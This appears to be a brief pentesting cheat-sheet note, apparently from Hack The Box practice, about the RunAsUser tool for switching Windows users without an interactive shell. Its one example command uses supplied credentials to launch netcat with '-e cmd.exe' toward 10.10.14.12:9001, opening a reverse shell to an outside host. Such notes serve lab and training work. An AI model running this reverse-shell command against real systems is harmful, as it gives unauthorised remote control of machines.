https://github.com/atthacks/RunAsUser
solves issue with switching users on windows boxes

to use runas you need an interactive shell
	if you dont, you wont be able to authenticate with the user's password

Example usage
```
RunAsUser.exe -u superadmin -p funnyhtb -f c:\users\public\nc.exe -a '10.10.14.12 9001 -e cmd.exe'
```